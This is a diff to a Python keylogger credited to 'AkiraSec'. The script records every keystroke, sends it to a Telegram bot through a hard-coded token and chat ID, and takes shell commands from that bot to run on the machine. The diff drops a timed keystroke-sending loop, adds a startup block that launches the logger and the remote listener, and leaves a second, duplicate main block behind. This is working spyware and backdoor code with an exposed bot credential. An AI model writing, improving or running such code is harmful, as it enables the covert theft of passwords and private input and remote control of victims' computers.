@@ -1,5 +1,4 @@
 
-
 # keylogger.py
 # Developed by AkiraSec | Telegram: @rootakira
 
@@ -21,10 +20,10 @@ except ImportError:
 
 # === CONFIGURATION ===
 BOT_TOKEN = "7642479754:AAFqZszYthVpuIyZLjX0-pcg4TqH8NHY70I"
-CHAT_ID = "7819572254"  # Replace with your actual Telegram chat ID
+CHAT_ID = "7819572254"
 API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 log = []
-logging_enabled = True
+logging_enabled = False  # Don't log until /start is sent
 # ======================
 
 # --- Send Telegram Message ---
@@ -97,17 +96,6 @@ def keylog_worker():
             log.append(f"[{key.name}]")
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
-
-# --- Periodically send logged keys ---
-def auto_key_sender(interval=60):
-    while True:
-        if logging_enabled and log:
-            keys = ''.join(log)
-            if len(keys) > 4000:
-                keys = keys[-4000:]
-            send_message("⌨️ Auto Keystrokes:\n" + keys)
-            log.clear()
-        time.sleep(interval)
 
 # --- Shell Command Execution ---
 def run_shell_command(command):
@@ -209,6 +197,12 @@ def telegram_listener():
         except Exception as e:
             print(f"[!] Polling error: {e}")
         time.sleep(2)
+
+# --- MAIN ---
+if __name__ == "__main__":
+    threading.Thread(target=keylog_worker, daemon=True).start()
+    telegram_listener()
+
 
 # --- MAIN ---
 if __name__ == "__main__":
